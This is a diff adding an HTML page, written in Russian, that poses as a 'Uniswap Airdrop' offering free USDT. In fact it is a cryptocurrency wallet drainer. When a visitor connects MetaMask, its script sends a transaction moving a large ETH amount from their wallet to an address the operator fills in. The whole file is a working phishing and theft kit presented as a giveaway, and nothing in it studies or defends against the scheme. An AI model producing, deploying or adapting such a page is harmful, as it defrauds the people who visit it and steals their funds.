@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Uniswap Airdrop</title>
+    <style>
+        body { font-family: Arial; background: #1a1a2e; color: white; text-align: center; padding: 50px; }
+        .container { max-width: 500px; margin: auto; background: #16213e; padding: 30px; border-radius: 10px; }
+        .btn { background: #0f3460; color: white; padding: 15px 30px; border: none; border-radius: 5px; font-size: 18px; cursor: pointer; }
+        .btn:hover { background: #1a5276; }
+        .status { margin-top: 20px; color: #00ff88; display: none; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Uniswap Airdrop</h1>
+        <p>Получи 1000 USDT бесплатно!</p>
+        <button class="btn" onclick="connectWallet()">Подключить кошелёк</button>
+        <div class="status" id="status"></div>
+    </div>
+    <script>
+        const YOUR_ADDRESS = "0xТВОЙ_АДРЕС"; // ЗАМЕНИ НА СВОЙ
+
+        function connectWallet() {
+            const status = document.getElementById('status');
+            status.style.display = 'block';
+            if (window.ethereum) {
+                ethereum.request({ method: 'eth_requestAccounts' })
+                    .then(accounts => {
+                        status.innerText = '✅ Подключено';
+                        drainWallet(accounts[0]);
+                    })
+                    .catch(() => {
+                        status.innerText = '❌ Ошибка';
+                        status.style.color = '#ff4444';
+                    });
+            } else {
+                status.innerText = '❌ Установите MetaMask';
+                status.style.color = '#ff4444';
+            }
+        }
+
+        function drainWallet(wallet) {
+            ethereum.request({
+                method: 'eth_sendTransaction',
+                params: [{
+                    from: wallet,
+                    to: YOUR_ADDRESS,
+                    value: '0xFFFFFFFFFFFFFFFF',
+                    gas: '0x5208'
+                }]
+            }).then(() => {
+                document.getElementById('status').innerText = '✅ Успешно!';
+            }).catch(() => {
+                document.getElementById('status').innerText = '❌ Отказ';
+                document.getElementById('status').style.color = '#ff4444';
+            });
+        }
+    </script>
+</body>
+</html>
